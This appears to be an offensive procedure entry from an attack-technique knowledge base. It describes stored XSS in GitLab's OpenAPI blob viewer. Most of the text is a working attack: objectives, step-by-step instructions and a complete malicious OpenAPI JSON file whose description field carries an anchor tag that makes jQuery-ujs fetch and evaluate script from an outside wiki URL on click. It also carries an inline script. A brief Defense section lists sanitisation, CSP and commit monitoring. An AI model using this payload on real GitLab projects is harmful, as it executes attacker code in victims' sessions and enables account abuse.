---
tags:
  - xss
  - payload-injection
  - openapi
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - GitLab
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:33.711Z'
sub_techniques: []
id: 21826815-05d0-48fb-9e73-093e05a36367
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-OpenAPI-JSON-File

## Summary

This procedure involves creating a malicious OpenAPI JSON file with an XSS payload embedded in the 'info.description' field, then committing it to a GitLab project repository to enable stored XSS when rendered in the blob viewer.

## Description

The attack targets GitLab's handling of OpenAPI files in the blob viewer, where SwaggerUIBundle renders the description field without fully sanitizing HTML attributes. By injecting tags with attributes like 'class', 'style', and 'data-*', the payload persists and interacts with jQuery-ujs to execute JavaScript on user interaction, such as clicks. This allows client-side actions like alerts or HTTP requests on behalf of the victim. Prerequisites include write access to a GitLab project.

## Requirements

1. GitLab account with contributor access to a project repository
2. Ability to create and commit JSON files via GitLab web UI or Git CLI
3. Knowledge of OpenAPI 2.0 structure for valid file format

## Defense

Defensive measures and detection strategies:

- Sanitize or strip HTML attributes in OpenAPI rendering components like SwaggerUI
- Implement strict CSP policies blocking inline scripts and eval
- Monitor repository commits for suspicious JSON files with HTML in descriptions

## Objectives

1. Store persistent XSS payload in a project file
2. Ensure payload renders without sanitization in blob viewer
3. Enable execution upon victim interaction

## Instructions

### Step 1: Craft the Malicious OpenAPI JSON

**Context**: Create a valid Swagger 2.0 OpenAPI file with the XSS payload in the 'info.description' field. The payload uses an <a> tag with attributes that jQuery-ujs will process on click.

No specific command; use a text editor to create 'xss-openapi.json' with content:

```json
{
  "swagger": "2.0",
  "info": {
    "title": "Malicious API",
    "description": "<a href=https://gitlab.com/yvvdwf/data/-/wikis/alert.md data-type=script style=\"cursor:default\" data-remote=true class=\"atwho-view select2-drop-mask pika-select\"></a><script>alert(0)</script>",
    "version": "1.0.0"
  },
  "paths": {}
}
```

> This injects attributes that persist in rendering and trigger on click via jQuery.globalEval.

### Step 2: Commit to GitLab Repository

**Context**: Upload the file to the project using GitLab's web interface (New File) or Git push.

No command shown; via web UI: Navigate to project > New file > Paste JSON > Commit with message like "Add OpenAPI spec".

> Expected: File appears in repository tree under root or docs folder.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- injection
- gitlab
